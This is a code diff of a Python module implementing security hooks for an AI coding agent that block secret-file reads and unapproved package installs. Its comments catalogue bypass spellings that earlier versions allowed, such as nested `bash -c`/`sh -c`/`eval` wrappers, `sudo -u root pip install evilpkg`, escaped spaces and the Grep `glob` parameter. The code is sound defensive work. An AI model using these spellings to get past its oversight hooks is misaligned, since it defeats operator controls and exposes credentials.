@@ -18,9 +18,21 @@ from __future__ import annotations
 
 import json
 
+import cmdpos          # round-4: THE command-position model, one definition
+
 # The seven gates the SDK substrate carries (R-7). ci-mirror and the
 # observability hooks stay shell-only; SessionStart/SessionEnd-class events
 # have no Python-SDK HookEvent and remain shell (AC-7-3).
+#
+# [upstream P2-2] This is a SUBSET, not parity. `git push` has no gate here
+# at all. Do not describe this module as equivalent to the shell suite.
+#
+# [upstream P2-3] WHEN THIS MODULE IS LIVE: only when the install resolved
+# `gate_substrate: "sdk-callable"` AND the consumer runtime calls
+# build_hooks(). On a `gate_substrate: "shell"` install the file is still
+# emitted but NOTHING references it - `grep -c sdk_gates .claude/settings.json`
+# returns 0 - so it enforces nothing. That is intended, but it was never
+# stated, and a reader reasonably assumes an emitted gate module is active.
 SDK_GATES = (
     "secrets-gate", "spec-gate-commit", "dependency-gate", "test-gate",
     "eval-gate", "tdd-gate", "format-lint-gate",
@@ -53,6 +65,7 @@ import asyncio
 import fnmatch
 import os
 import re
+import shlex
 from pathlib import Path
 
 from claude_agent_sdk import HookMatcher
@@ -120,6 +133,395 @@ def _norm_pat(pat):
     return pat.replace("**", "*").replace("[^", "[!").lower()
 
 
+# Shell operators are not part of a word when unquoted, so they delimit
+# path candidates: `cd secrets; cat prod.yaml` must yield `secrets`, not
+# `secrets;`. shlex keeps them attached (it is not a shell parser), so they
+# are split out here. Shell parity (the gate's _sg_raw).
+_SH_OPS = re.compile(r"[;&|()<>]")
+# A strictly-shaped assignment hides a path behind an expansion the gate
+# cannot perform: `F=.env; cat $F`. The assignment itself is in plain sight.
+_ASSIGN = re.compile(r"^[A-Za-z_]\\w*=(.*)$", re.S)
+# [lens B finding 4] The ONE deliberate relaxation: dotenv TEMPLATE names are
+# conventionally secret-free and committed, so `.env*` blocking
+# `cat .env.example` blocks a file whose whole purpose is to be read. Exact
+# basenames only, so `.env.production` and `.env.example.real` are untouched.
+_DOTENV_TEMPLATES = frozenset({
+    ".env.example", ".env.sample", ".env.template", ".env.dist",
+    ".env.defaults", "env.example", "env.sample", "env.template",
+})
+# [round-2 review F-870] A shell invoker's argument is a COMMAND LINE, not
+# prose, so its quoted run is re-parsed; every other command's quoted run stays
+# one opaque candidate. Deciding this on WHO THE COMMAND IS - rather than on
+# what the run looks like - is what lets `sh -c 'cat secrets/prod.yaml'` block
+# while `git commit -m "fix the .env loader"` stays allowed.
+#
+# [round-4 D3] `_SHELL_INVOKERS` and `_CMD_PREFIXES` are no longer WRITTEN
+# here. They are interpolated from lib/cmdpos.py into the emitted prelude,
+# together with `_CMD_PFX_RE`, because a comment claiming "kept in sync with
+# CMD_PFX / _cs_isinv on the shell side" is worth nothing: `_CMD_PFX_RE` sat
+# byte-identical to the previous commit while its shell twin grew, over a
+# comment reading "Shell parity: this is CMD_PFX from the shell header, same
+# alternation in the same order". Twelve spellings diverged - `setsid pip
+# install evilpkg`, `doas git commit -m x` and ten more allowed here and
+# denied there. Interpolation is what makes the claim structural.
+#
+# Defined in the emitted prelude (see sdk_gates_module):
+#   _SHELL_INVOKERS   _CMD_PREFIXES   _CMD_PFX_RE
+
+
+# Two operator sets, mirroring the two the shell carries, because the two
+# consumers need different things and the shell is the contract:
+#   _SECRETS_OPS = the gate's _sg_raw. `<` and `>` delimit a WORD there, so
+#     `base64 <.env` yields `.env`.
+#   _CMD_OPS = the header's _cs_ops. Redirections are NOT separators there;
+#     they are skipped by _CMD_PFX_RE at command position instead, so
+#     `>/dev/null pip install evil` keeps `pip install` at the head of its
+#     segment. A backtick IS a separator - it runs its contents.
+_CS_WS = "\\002"
+# [round-4 D5] How many times an invoker's argument is re-expanded, with the
+# invoker test RE-APPLIED at each level. Stated once, both substrates, and
+# asserted equal by tests/test_composition.py.
+#
+# The round-4 brief prescribes 2 on the strength of a measurement that "depth
+# 3 added nothing observable". That measurement was taken against the BROKEN
+# scanner - the one that desynced on a backslash-escaped quote - so the third
+# level it was looking for had already been mis-parsed away. With the scanner
+# fixed, 3 is load-bearing and the executed case is the corpus's NST-01:
+#
+#   bash -c 'sh -c "echo x; sh -c '"'"'pip install evilpkg'"'"'"'
+#
+# which is three nested shells and is recorded as PROVEN TO EXECUTE ("PIP RAN:
+# install evilpkg" with a fake pip on PATH). At 2 the innermost argument is
+# reached but never split, so `pip install evilpkg` stays one flattened token
+# and no install head matches. Where this document and an executed result
+# disagree, the executed result wins.
+#
+# 4 was BUILT AND MEASURED on both substrates and changed no verdict on the
+# round-4 probe corpus: a fourth level needs four nested quoting contexts,
+# which no reachable spelling produces.
+_EXPAND_DEPTH = 3
+_SECRETS_OPS = ";&|()<>\\n"
+_CMD_OPS = ";&|()`\\n"
+
+
+def _quoted_runs(cmd):
+    r"""Every quoted run in `cmd`, contents only. No regex, so there is no
+    escaping question about what the pattern means.
+
+    [round-4 D5] Backslash-aware. It was not, and that is D5's actual root
+    cause - an earlier diagnosis blamed recursion DEPTH, a reviewer built
+    depth-3 recursion, and two of D5's three reproductions still allowed
+    because the scanner was desyncing on `\"` before recursion ever ran.
+    Exactly one level of quote removal is performed on the run, which is what
+    the shell does and what lets the next level see the inner quotes of
+    `bash -c "sh -c \"pip install evil\""`.
+    """
+    runs, cur, quote, esc = [], [], None, False
+    for ch in cmd:
+        if esc:
+            cur.append(ch)
+            esc = False
+        elif ch == "\\\\" and quote != "'":
+            esc = True                     # one level of quote removal
+        elif quote:
+            if ch == quote:
+                runs.append("".join(cur))
+                cur = []
+                quote = None
+            else:
+                cur.append(ch)
+        elif ch in ("'", '"'):
+            quote = ch
+    if cur:
+        runs.append("".join(cur))
+    return runs
+
+
+def _invoker_at(toks):
+    r"""Index of the shell invoker at the head of `toks`, or None.
+
+    [round-4 D8] THE single head scan. There were TWO, and the round-4
+    prescription touched one: `_expand_invoker_args` fed dependency-gate while
+    `_segment_candidates` carried its own inline whitespace split for
+    secrets-gate. A reviewer implemented the whole prescription and the
+    candidate set for `bash -c "cat 'secrets/...'"` was BYTE-IDENTICAL before
+    and after, because the fix landed in the copy that gate does not use.
+    Both callers now ask this function.
+
+    [round-4 D1/D2/D7] THE BOUND IS GONE. `saw_prefix and i < 4` could not
+    reach the invoker behind `timeout -k 1 -s KILL 5 sh -c` (five tokens) or
+    `env A=1 B=2 C=3 D=4 sh -c`. The replacement is not an arity table - one
+    was built and measured to regress 16 of 27 real wrapper-flag spellings,
+    mostly LONG forms of flags whose short form was in the table. Once a
+    wrapper word is seen, skip until an invoker turns up or the tokens run
+    out; `grep -r sh f` never starts the skip because `grep` is not a wrapper,
+    which is the whole safety argument. See lib/cmdpos.py.
+    """
+    saw_prefix = False
+    for i, tok in enumerate(toks):
+        base = tok.rsplit("/", 1)[-1]
+        # An invoker is tested FIRST so a DUAL word (watch/xargs/ssh, both a
+        # transparent prefix and a thing whose argument is a command line)
+        # reports here rather than being skipped past.
+        if base in _SHELL_INVOKERS:
+            return i
+        if base in _CMD_PREFIXES or _ASSIGN.match(tok):
+            saw_prefix = True
+            continue
+        if tok.startswith("-"):
+            continue                       # a flag is never the command word
+        if saw_prefix:
+            continue                       # a wrapper's own operand
+        return None                        # an ordinary command at the head
+    return None
+
+
+def _flatten_seg(seg):
+    r"""Drop quote characters and turn whitespace inside a quoted run into a
+    non-space sentinel, so the run stays one token for the `\\S+` patterns.
+    Applied AFTER invoker expansion, which needs the quotes to find the
+    argument. Shell parity (cmd_segments' _CS_WS handling).
+
+    [round-4 D10] The `r` prefix is load-bearing. Without it this docstring
+    raised `SyntaxWarning: "\\S" is an invalid escape sequence` in the EMITTED
+    module - and under `-W error::SyntaxWarning`, or a future Python where
+    the warning hardens into an error, the import fails and every SDK gate
+    is disabled at once. Nothing compiled the emitted artifact, so the golden
+    digest simply re-baselined over it. tests/test_sdk_gates.py now compiles
+    the rendered source under `-W error`; prefer `r` on any docstring here
+    that names a regex."""
+    out = _shell_segments(seg, "", flatten=True)
+    return out[0] if out else ""
+
+
+def _expand_invoker_args(segs):
+    """A shell invoker's quoted argument is a COMMAND LINE, so segment it
+    too. Shell parity (_cs_isinv / _CS_EXTRA in the shared header).
+
+    [round-3 lens A, A1] Without this, `sh -c 'true; pip install evil'`
+    reached dependency-gate as ONE segment headed by `sh`, no install verb
+    was ever at command position, and the install ran. Both substrates
+    agreed on allow, so the differential could not see it. The J-7
+    retirement that made quoted separators non-splitting is correct for
+    prose and false for an invoker: `sh -c` really does run its argument.
+    Additive - the original segment is kept as well.
+
+    [round-4 D5] DEPTH 2, re-applying the invoker test at EACH level. Depth 3
+    was implemented and measured to add nothing observable. The thing that is
+    easy to get wrong, and that would be worse than leaving D5 open: expanding
+    every quoted run instead of RE-TESTING the invoker. That re-opens J-7 and
+    lens B finding 4 wholesale - prose in a commit message becoming a command
+    line - so the recursion carries the test with it.
+    """
+    out, frontier, depth = list(segs), list(segs), 0
+    while frontier and depth < _EXPAND_DEPTH:
+        nxt = []
+        for seg in frontier:
+            if _invoker_at(seg.split()) is None:
+                continue
+            for inner in _invoker_arguments(seg):
+                if inner.strip():
+                    nxt.extend(_shell_segments(inner, _CMD_OPS))
+        out.extend(nxt)
+        frontier = nxt
+        depth += 1
+    return out
+
+
+def _invoker_arguments(seg):
+    r"""Every argument of an invoker-headed segment that is a COMMAND LINE.
+
+    Two sources, because an invoker's argument is one shell WORD and there is
+    more than one way to spell one:
+
+      quoted   sh -c 'pip install evil'      -> _quoted_runs
+      escaped  sh -c pip\\ install\\ evil      -> shlex
+
+    [round-4 D5, third reproduction] Only the first source existed, so the
+    escaped spelling had no quoted run to expand and reached dependency-gate
+    as one opaque segment - `shell=0, SDK=0`, and it EXECUTES. An earlier
+    diagnosis attributed all of D5 to recursion depth; depth cannot help a
+    shape that produces nothing to recurse into.
+
+    shlex is best-effort: it refuses an unbalanced quote, and on that path the
+    quoted source has already contributed. Additive, never a replacement.
+    """
+    found = list(_quoted_runs(seg))
+    try:
+        toks = shlex.split(seg, posix=True)
+    except ValueError:
+        return found
+    idx = _invoker_at(toks)
+    if idx is None:
+        return found
+    for tok in toks[idx + 1:]:
+        if any(c.isspace() for c in tok) and tok not in found:
+            found.append(tok)
+    return found
+
+
+def _shell_segments(cmd, ops=_SECRETS_OPS, flatten=False):
+    """Split on UNQUOTED operators and newlines -> the units at which a new
+    command can begin.
+
+    Quote-aware, so a `;` or a newline INSIDE a quoted argument does not
+    start a new command. Two things depend on that:
+
+      * command position, which the invoker rule keys on. shlex.split
+        discards newlines along with every other whitespace run, so an
+        `sh -c` on the second LINE of a command reached its token with the
+        tracker already past command position, the invoker rule never
+        fired, and the SDK would have allowed what the shell blocks - the
+        exact direction this module's binding rule forbids.
+      * not splitting quoted tokens on operators. The previous version ran
+        _SH_OPS.split over every shlex token, so `git commit -m "refactor
+        (parse .env) handling"` was torn into parts and denied while the
+        shell allowed it. Operators are handled HERE, before quotes are
+        removed, so a token that still contains one was quoted and is left
+        whole.
+
+    An unterminated quote takes the rest of the string as one segment,
+    which is what the shell gate does.
+    """
+    # [round-3 lens A, A5] `flatten` mirrors the shell's cmd_segments: the
+    # whitespace INSIDE a quoted run becomes a non-space sentinel so the run
+    # stays ONE token (every option-run and assignment pattern is built from
+    # `\\S+`, and a quoted value containing a space otherwise ends the run
+    # early), and the quote characters are dropped so `"pip" install evil`
+    # reaches the tool matcher. Off for the secrets tokenizer, which hands
+    # its output to shlex and needs the quotes intact.
+    # [round-4 D5] Backslash-aware, on both paths. Without it `bash -c "sh -c
+    # \"pip install evil\""` desynced the scanner - the escaped quote closed
+    # the run - so the outer argument was read as `sh -c \\` and everything
+    # after it fell outside any quote. An escaped separator was likewise
+    # treated as a separator, which splits a command the shell would not.
+    # `flatten` keeps the escaped character and drops the backslash (the run
+    # is being reduced to one token anyway); the shlex path keeps both,
+    # because shlex performs its own quote removal downstream.
+    segs, cur, quote, esc = [], [], None, False
+    for ch in cmd:
+        if esc:
+            esc = False
+            # [round-4] An ESCAPED character is emitted literally, including a
+            # space - it is NOT the same as whitespace inside a quoted run.
+            # Mapping it to _CS_WS glued `\\ pip\\ install\\ evil` into one token
+            # and no install head could match it, so the SDK allowed what the
+            # shell denied. The shell restores escapes to real characters when
+            # it emits a segment (_cs_esc_restore); this is that parity. Found
+            # by the backslash axis the round-4 composition sweep adds.
+            cur.append(ch)
+        elif ch == "\\\\" and quote != "'":
+            esc = True
+            if not flatten:
+                cur.append(ch)
+        elif quote:
+            if ch == quote:
+                quote = None
+                if not flatten:
+                    cur.append(ch)
+            elif flatten and ch.isspace():
+                cur.append(_CS_WS)
+            else:
+                cur.append(ch)
+        elif ch in ("'", '"'):
+            quote = ch
+            if not flatten:
+                cur.append(ch)
+        elif ch in ops:
+            segs.append("".join(cur))
+            cur = []
+        else:
+            cur.append(ch)
+    if esc and not flatten:
+        pass                    # a trailing backslash is already in `cur`
+    segs.append("".join(cur))
+    return [s for s in segs if s.strip()]
+
+
+def _bash_candidates(cmd):
+    # [lens A F1 / lens B finding 4] Tokenize the way the SHELL does: split
+    # on UNQUOTED whitespace only, joining adjacent quoted and unquoted runs
+    # into one token. A quoted argument is then ONE candidate (the words
+    # inside a commit message are not paths), while `cat ".env"` still
+    # yields `.env` and `cat .en''v` reassembles to `.env`. shlex.split in
+    # POSIX mode is exactly that tokenizer, including backslash escapes and
+    # multi-line input - the shell gate's hand-rolled equivalent exists only
+    # because bash has no shlex.
+    out = []
+    for _seg in _shell_segments(cmd):
+        out.extend(_segment_candidates(_seg))
+    return out
+
+
+def _segment_candidates(cmd, _depth=0):
+    # One SEGMENT - operators and unquoted newlines already removed, so
+    # every token here belongs to the same command and the first one is at
+    # command position.
+    try:
+        toks = shlex.split(cmd, posix=True)
+    except ValueError:
+        # Unbalanced quote. shlex refuses; the shell gate takes the rest of
+        # the line as the quoted run. Fall back to a whitespace split rather
+        # than returning nothing - a parse failure must not become an allow.
+        #
+        # [v2.6.2] ...which is exactly what it DID become. A bare split
+        # leaves the quote glued to the token, so `cat "secrets/prod.yaml`
+        # yielded `"secrets/prod.yaml`, matched no pattern, and this
+        # substrate ALLOWED what the shell blocked - the direction the
+        # module's own binding rule forbids, in the fallback whose comment
+        # promises the opposite. Emit the quote-stripped form as well; on a
+        # parse failure the deny-list bias has to be over-match.
+        toks = []
+        for raw in cmd.split():
+            toks.append(raw)
+            stripped = raw.replace('"', "").replace("'", "")
+            if stripped and stripped != raw:
+                toks.append(stripped)
+        # The fallback path did NOT go through _shell_segments' quote
+        # tracking, so its tokens can still carry operators; those are the
+        # only ones _SH_OPS is applied to now.
+        toks = [p for raw in toks for p in _SH_OPS.split(raw) if p]
+    out = list(toks)
+    for tok in toks:
+        m = _ASSIGN.match(tok)
+        if m and m.group(1):
+            # `F=.env; cat $F` hides the path behind an expansion this gate
+            # cannot perform, but the ASSIGNMENT is in plain sight.
+            out.append(m.group(1))
+    # [round-4 D8] ONE head scan, shared with _expand_invoker_args. This
+    # function used to carry its own - a separate `saw_prefix`/`skipped < 3`
+    # copy - which is why fixing the OTHER one changed nothing for this gate.
+    idx = _invoker_at(toks)
+    if idx is None:
+        return out
+    # [round-4 D8] RE-PARSE, do not re-tokenize. `tok.split()` is a whitespace
+    # split, not a shell parse, so a nested quote stayed glued to the word and
+    # one extra pair of quotes bypassed the gate this module repeatedly calls
+    # the one with no override path:
+    #
+    #     bash -c "cat secrets/prod.yaml"      deny
+    #     bash -c "cat 'secrets/prod.yaml'"    ALLOW   <-- reads the file
+    #     sh   -c "cat '.env'"                 ALLOW
+    #     eval    "cat '.env'"                 ALLOW
+    #
+    # Backlog J-15 recorded this as an over-match "in the cheap direction",
+    # which is inverted: executed, J-15's own example allows. Recursing
+    # through the real parser fixes it and subsumes the multi-line case that
+    # `read -ra` broke on the shell side.
+    #
+    # Depth 2, re-applying the invoker test at each level - NOT "expand every
+    # quoted run", which would make prose in a commit message a command line.
+    for tok in toks[idx + 1:]:
+        if not any(c.isspace() for c in tok):
+            continue
+        if _depth < _EXPAND_DEPTH:
+            for inner in _shell_segments(tok):
+                out.extend(_segment_candidates(inner, _depth + 1))
+        else:
+            out.extend(w for w in tok.split() if w)
+    return out
+
+
 def _secrets_gate(config):
     # Precompute the normalized pattern once (config-constant) rather than
     # per PreToolUse event - this is the hottest matcher in a session.
@@ -132,21 +534,136 @@ def _secrets_gate(config):
         # under-match (shell T-1 semantics) - each pattern is tried
         # as-given AND with an implicit leading '*', case-insensitively,
         # against both basename and full path.
-        target = _tool_input(input_data).get("file_path") or ""
-        if not target:
+        # [upstream P0-2/P2-4] Every tool surface that can reach a file,
+        # not just file_path. NotebookEdit supplies notebook_path and was
+        # already matched by the old matcher substring while the path key
+        # went unread - the gate reported success while checking nothing.
+        # [lens A F7] ...and the Bash surface, which this module never
+        # received. settings.json wired the shell gate to BOTH `Bash` and
+        # the file matchers; _GATE_MATCHERS carried only the second, so
+        # under `gate_substrate: "sdk-callable"` `cat .env`,
+        # `grep -r . secrets/` and `cat deploy.pem` were entirely unguarded.
+        # That is the original P0-2 finding, unfixed on this substrate,
+        # while the table above claimed the two wirings were in sync.
+        ti = _tool_input(input_data)
+        # Structured path parameters and Bash-derived tokens are judged
+        # apart: `dir_ok` says whether a bare directory NAME counts as
+        # naming the directory, and that is true of a `path` parameter and
+        # not of a word in a shell command. See _match_secret. Shell parity
+        # (the gate's two-phase $_dir_ok loop).
+        path_targets = [ti.get(k) or ""
+                        for k in ("file_path", "notebook_path", "path")]
+        path_targets = [t for t in path_targets if t]
+        # [round-2 review F-788] `pattern` is a SEARCH REGEX, not a path, and
+        # it used to sit in the dir_ok=True group - so the bare-directory-stem
+        # arm hard-blocked `Grep{pattern:"secrets"}`, i.e. searching your own
+        # codebase for the word "secrets" was impossible on a default
+        # install, in the gate whose own comment says it has no override
+        # path. It still has to be MATCHED (`Grep{pattern:"*.pem"}` reads
+        # matching file contents), so it moves to dir_ok=False rather than
+        # being dropped. Shell parity (PAT_CANDIDATES).
+        # [round-4 D19] `glob` was inspected by NEITHER substrate, and
+        # `Grep{pattern:"KEY", glob:"*.pem", output_mode:"content"}` returns
+        # the matching file CONTENTS. Lens A's F6 finding re-entering through
+        # a SIBLING PARAMETER: `path` was fixed, `pattern` was fixed, and
+        # `glob` - which selects the same files - was never listed. It joins
+        # the PATTERN group, not the path group: it is a selector, so a bare
+        # directory name in it must not count as naming the directory, which
+        # is the same call F-788 made for `pattern`. Shell parity; the full
+        # per-parameter enumeration is written out beside the shell twin.
+        pat_targets = [t for t in [ti.get("pattern") or "",
+                                   ti.get("glob") or ""] if t]
+        cmd_targets = _bash_candidates(ti.get("command") or "")
+        if not path_targets and not pat_targets and not cmd_targets:
             return {}
-        base = os.path.basename(target).lower()
-        full = target.lower()
-        for pat, cpat in patterns:
-            if (fnmatch.fnmatchcase(base, cpat)
-                    or fnmatch.fnmatchcase(base, "*" + cpat)
-                    or fnmatch.fnmatchcase(full, cpat)
-                    or fnmatch.fnmatchcase(full, "*/" + cpat)
-                    or fnmatch.fnmatchcase(full, "*" + cpat)):
-                return _deny(f"BLOCKED: {target} matches never-read "
-                             f"pattern {pat}")
+        for targets, dir_ok in ((path_targets, True), (pat_targets, False),
+                                (cmd_targets, False)):
+            for target in targets:
+                # [round-2 review F-947] The dotenv exemption is scoped to
+                # the DOTFILE pattern family it exists to soften. It used to
+                # `continue` here, skipping every pattern including the
+                # `secrets/**` that must not be overridden, so
+                # `secrets/.env.example` was unguarded. _match_secret applies
+                # it per-pattern now. Shell parity ($_dotenv_tmpl).
+                # [round-4, corpus QOT-23] The basename is stripped of quote
+                # characters before the dotenv-template test. On an UNBALANCED
+                # quote shlex refuses, the fallback emits the raw token, and
+                # `cat '.env.example` reached here as `'.env.example` - which
+                # matches the `.env*` family but is not an exact template
+                # basename, so this substrate DENIED a file whose entire
+                # purpose is to be read while the shell allowed it. The
+                # shell's tokenizer drops quotes, so this is parity, and it is
+                # in the false-positive direction: a deliberately exempted
+                # file, blocked by the gate with no override path.
+                _b = os.path.basename(target).strip("\\"'").lower()
+                deny = _match_secret(target, patterns, dir_ok,
+                                     _b in _DOTENV_TEMPLATES)
+                if deny:
+                    return deny
         return {}
+
     return secrets_gate
+
+
+def _match_secret(target, patterns, dir_ok=True, dotenv_tmpl=False):
+    # [upstream P2-4] Mirrors the shell's three-form matching exactly.
+    # '*.pem'-style patterns keep the implicit leading '*' (free). The
+    # '.env*' dotenv family is matched on a DOT-SEGMENT boundary so
+    # config.env / prod.env still block (shell T-1) while my.envelope.gleam
+    # and dev.environment.md no longer false-block mid-plan. Everything else
+    # ('secrets/*') is path-segment anchored.
+    base = os.path.basename(target).lower()
+    full = target.lower()
+    for pat, cpat in patterns:
+        stem = cpat[:-1] if cpat.endswith("*") else cpat
+        # [lens A F6, both substrates] 'secrets/**' normalizes to 'secrets/*',
+        # which the anchored form matched only WITH the slash present, so
+        # Grep{"path": "secrets"} allowed - and a Grep whose path is the
+        # directory returns the matching file CONTENTS. Naming the directory
+        # reaches everything under it. Empty for non-directory patterns.
+        # [v2.6.2] Gated on dir_ok: applied to every candidate it made
+        # `grep secrets README.md` and `git commit -m secrets` block, which
+        # is lens B finding 4's failure mode reintroduced. Shell parity.
+        dstem = cpat[:-2] if (dir_ok and cpat.endswith("/*")) else ""
+        # [F-947] The dotenv-template exemption is per-PATTERN and applies to
+        # the dotfile family only. A template that also lives under a
+        # never-read DIRECTORY is a secret by location, and `secrets/**`
+        # decides that, not its basename.
+        if dotenv_tmpl and cpat.startswith("."):
+            continue
+        if cpat.startswith("*"):
+            hit = (fnmatch.fnmatchcase(base, cpat)
+                   or fnmatch.fnmatchcase(base, "*" + cpat)
+                   or fnmatch.fnmatchcase(full, cpat)
+                   or fnmatch.fnmatchcase(full, "*/" + cpat)
+                   or fnmatch.fnmatchcase(full, "*" + cpat))
+        elif cpat.startswith("."):
+            hit = (fnmatch.fnmatchcase(base, cpat)
+                   or fnmatch.fnmatchcase(base, "*" + stem)
+                   or fnmatch.fnmatchcase(base, "*" + stem + ".*")
+                   or fnmatch.fnmatchcase(full, cpat)
+                   or fnmatch.fnmatchcase(full, "*/" + cpat))
+        else:
+            hit = (fnmatch.fnmatchcase(base, cpat)
+                   or fnmatch.fnmatchcase(full, cpat)
+                   or fnmatch.fnmatchcase(full, "*/" + cpat)
+                   or bool(dstem) and (fnmatch.fnmatchcase(base, dstem)
+                                       or fnmatch.fnmatchcase(full, dstem)
+                                       or fnmatch.fnmatchcase(
+                                           full, "*/" + dstem)))
+        if hit:
+            return _deny(f"BLOCKED: {target} matches never-read "
+                         f"pattern {pat}")
+    return {}
+
+
+# [upstream P1-2, lens B finding 8] Enforcement is scoped to IMPLEMENTATION
+# paths. The shell gate got this at v2.6.0 and this module did NOT - it still
+# iterated every staged file - so under `gate_substrate: "sdk-callable"` the
+# bootstrap commit was still impossible (the gate blocked its own
+# `.claude/specs/INDEX.md`), which is the half of P1-2 the changelog reported
+# as fixed. Same constant, same order, so the two substrates cannot drift.
+_ENFORCED_PREFIXES = ("src/", "lib/", "app/", "test/", "tests/")
 
 
 def _spec_gate_commit(config):
@@ -155,7 +672,7 @@ def _spec_gate_commit(config):
         # spec. Word-boundary match on path or basename (shell S-3
         # semantics), never a loose substring.
         cmd = _tool_input(input_data).get("command") or ""
-        if "git commit" not in cmd:
+        if not _git_verb(cmd, "commit"):
             return {}
         proj = _proj()
         try:
@@ -165,6 +682,10 @@ def _spec_gate_commit(config):
         except OSError:
             staged_raw = ""            # mirrors shell `2>/dev/null || true`
         staged = [f for f in staged_raw.splitlines() if f.strip()]
+        if not staged:
+            return {}
+        staged = [f for f in staged
+                  if f.startswith(_ENFORCED_PREFIXES)]
         if not staged:
             return {}
         corpus_files = []
@@ -203,13 +724,222 @@ def _spec_gate_commit(config):
     return spec_gate_commit
 
 
-_INSTALL_VERBS = re.compile(
-    r" (?:python[0-9.]* -m pip install|pip[0-9.]* install|pipx install"
-    r"|npm install|npm i|yarn add|pnpm add) ")
+# [upstream P2-1, decision recorded] CANONICAL SUBSTRATE = THE SHELL SUITE.
+# The shell is the default gate_substrate, ships on every install, and
+# carries 11 gates to this module's 7. The binding rule is therefore: this
+# module MUST NOT allow what the shell blocks, and MUST NOT block what the
+# shell allows. Where the two disagreed, five dependency cases the shell
+# allowed this module denied, and the reverse held on commits - so whichever
+# substrate was live changed project behavior completely.
+#
+# [lens A F7 / lens B finding 8] THAT RULE WAS ASSERTED AND NOT TRUE. At
+# v2.6.0 it was violated in BOTH directions at once: this module allowed
+# `cat .env` on the Bash surface (which the shell blocked, because
+# _GATE_MATCHERS carried no Bash entry for secrets-gate), and it denied
+# `python3 -m pip install evil` and a docs-only `git commit` (which the shell
+# allowed, because ENFORCED_PREFIXES was never ported). Seven confirmed
+# disagreements survived a commit message claiming "all 13 disputed cases now
+# agree". The rule is now enforced by a TEST rather than by this comment:
+# tests/test_substrate_differential.py pushes one payload corpus through the
+# emitted shell hooks AND build_hooks(RESOLVED_CONFIG) and fails on any
+# verdict that differs. Note what "canonical" means in the two cases where
+# the SHELL was the weaker substrate (the chained-install fail-open, the
+# unanchored eval-gate): reconcile to the shell's INTENT, never copy its bug.
+#
+# [upstream P1-4 port] Matching is anchored to COMMAND POSITION, not a bare
+# substring. `"git commit" not in cmd` had the identical weakness as the
+# shell's `case *"git commit"*`: it missed `git  commit`, a tab,
+# `git --no-pager commit` and `git -C /repo commit`, and it fired on the
+# string appearing in a comment, a quoted argument or a grep pattern.
+# Command-position prefixes that do not change WHICH program runs.
+#
+# [round-2 review F-401] The redirection / brace / keyword arms are new on
+# BOTH substrates: `>/dev/null pip install evil`, `time pip install evil`,
+# `{ pip install evil; }` and `if true; then pip install evil; fi` all
+# evaded the anchor with one token.
+#
+# [round-4 D3/D9] `_CMD_PFX_RE` is now INTERPOLATED from lib/cmdpos.py, in
+# the emitted prelude, together with the two membership sets. The version
+# that used to be written here carried `env|sudo` plus six transparent
+# commands, against the shell's twelve-plus - the comment above it claimed
+# "same alternation in the same order" and had been false for two commits.
+# It also could not consume a wrapper's POSITIONAL, which is D9: `sudo -u
+# root pip install evilpkg` was rc=0 on both substrates at all three commits.
+# [round-2 review F-381] RE-SYNCED to the shell's cmd_has_verb. The shell
+# was rewritten at v2.6.2 - newline as a command separator, sudo/VAR=/path
+# prefixes - and this template was left at the v2.6.0 form, so the SDK
+# ALLOWED what the shell blocked across test-gate, spec-gate-commit and
+# eval-gate: `git add -A` + newline + `git commit`, `sudo git commit`,
+# `FOO=1 git commit`, `/usr/bin/git commit`, `env GIT_AUTHOR=x git commit`.
+# That is the direction this module's binding rule forbids, and `git show
+# 4cc9742` proves the two anchors AGREED at the parent - the divergence was
+# created by the batch that rewrote one side. The differential's verb corpus
+# was entirely single-line and unprefixed, which is why 107/107 held over
+# it; batch 1 added those shapes before this fix landed.
+_GIT_VERB_TMPL = (r"(?:^|[;&|()`\\n])\\s*" + _CMD_PFX_RE + r"(?:\\S*/)?git"
+                  r"(?:\\s+-[Cc]\\s+\\S+|\\s+-\\S+)*\\s+%s(?:\\s|$)")
+
+
+def _git_verb(cmd, verb):
+    """True if `cmd` invokes `git <verb>` at a command position.
+
+    [round-3 lens A, A5] Runs over quote-aware SEGMENTS rather than the raw
+    string. Searching the raw string treated a newline as a separator even
+    inside a quoted value, so `git -c a.b="p<newline>q" commit` put the verb
+    off command position and every command gate allowed it. Shell parity
+    (cmd_has_verb over cmd_segments).
+
+    [round-4 D1, THE SDK HALF] `_expand_invoker_args` was missing here, and
+    only `_scan_install_line` ever called it. So an invoker's argument was a
+    command line for dependency-gate and opaque data for every VERB gate:
+
+        sh -c 'git commit -m x'      shell=deny  SDK=allow
+        bash -c / zsh -c / dash -c / eval / busybox sh -c / ssh box - same
+
+    That is test-gate, spec-gate-commit and eval-gate simultaneously, in the
+    direction this module's own binding rule forbids, and it accounts for the
+    entire SDK half of the wrapper class. A fixer who repairs only what D1's
+    SHELL cause names (`_cs_isinv`) leaves every one of them open - which is
+    what the round-4 brief flags and what makes this one line load-bearing.
+    """
+    pat = _GIT_VERB_TMPL % verb
+    return any(re.search(pat, " " + _flatten_seg(seg) + " ")
+               for seg in _expand_invoker_args(
+                   _shell_segments(cmd, _CMD_OPS)))
+
+
+_TOOLS = (r"npm|pnpm|yarn|bun|pip[0-9.]*|pipx|poetry|uv|pipenv|cargo|gem"
+          r"|composer|mix|rebar3|gleam|go|deno")
+_VERBS = r"install|i|add|get|require|get-deps|deps\\.get"
+# Command-position prefixes that do not change WHICH program runs, so the
+# install verb is still the verb. Shell parity (the shell gate's PFX) - the
+# same _CMD_PFX_RE the git-verb anchor uses, so the two anchors cannot drift
+# apart again the way F-381 let them.
+_PREFIX = _CMD_PFX_RE
+# An install invocation at the START of a segment - not merely present
+# somewhere in it. The tool may carry a path (`/usr/bin/pip install`);
+# `python -m pip install` and `uv pip install` are spelled out because the
+# token at command position is not the installer. Shell parity (HEAD).
+# [lens A F3 residue] Run-without-installing channels: `npx evil`, `uvx
+# evil`, `pnpm dlx evil`, `bunx evil`, `npm exec evil`, `yarn dlx evil` all
+# fetch and EXECUTE an unapproved package. Not installing it first is not a
+# mitigation. NEWLY BLOCKED on both substrates. Shell parity (RUNNERS).
+# [round-4 D16/D20] Interpolated from lib/cmdpos.py in the emitted prelude,
+# together with _PIPE_TO_SHELL, _REMOTE_RUN and _UV_WITH. `yarn create`,
+# `npm init <pkg>`, `pnpm create`, `bun create`, `pipx run`, `uv tool run` and
+# `bun x` were all missing, and the shell's list was a separate literal - the
+# same two-copies arrangement that produced D3.
+#   Defined in the emitted prelude: _RUNNERS
+_INSTALL_HEAD = re.compile(
+    r"^\\s*" + _PREFIX
+    + r"(?:python[0-9.]*\\s+-m\\s+pip\\s+install"
